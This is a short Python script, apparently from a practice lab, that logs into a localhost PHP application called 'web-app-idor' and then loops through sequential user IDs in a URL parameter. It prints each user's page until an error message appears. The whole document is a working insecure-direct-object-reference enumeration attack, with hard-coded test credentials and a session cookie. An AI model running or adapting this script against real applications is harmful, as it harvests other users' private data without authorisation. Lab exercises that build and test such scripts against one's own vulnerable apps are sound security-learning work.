import requests  # Import the 'requests' library for making HTTP requests

base_url = "http://localhost/web-app-idor/index.php?id="  # Define the base URL for the web application
login_url = "http://localhost/web-app-idor/login.php"
id = 1  # Initialize the starting user ID

session = requests.Session() # Init session

# Cookie
cookie = {
    'PHPSESSID': 'lr7p8fe99jvj7o76sum01e9qp7'  # Replace with the actual cookie name
}

# Create a dictionary containing form data for the login request
payloads = {
    'username' : 'galihap76', # Set the username field
    'password' : 'testing_code', # Set the password field
    'submit' : 'submit' # Set the submit field
}

# Send a POST request to the login URL with the provided form data
res = session.post(login_url, data=payloads)

# Check if the response status code is 200 (OK)
if res.status_code == 200:

    while True:  # Start an infinite loop
        url = f"{base_url}{id}"  # Construct the complete URL with the current user ID
        response = session.get(url, cookies=cookie)  # Send a GET request to the URL

        if response.status_code == 200:  # Check if the response status code is 200 (OK)
            html_content = response.text  # Get the HTML content from the response

            if "Undefined variable" in html_content:  # Check if the content includes the text "Undefined variable"
                break  # Exit the loop if the text is found
            else:
                # Print the data for the current user ID if the text is not found
                print(f"Data for user id {id}:\n{html_content}\n")
                id += 1  # Increment the user ID for the next iteration

        else:
            # Print an error message if the response status code is not 200
            print(f"Failed to retrieve data for id {id}")
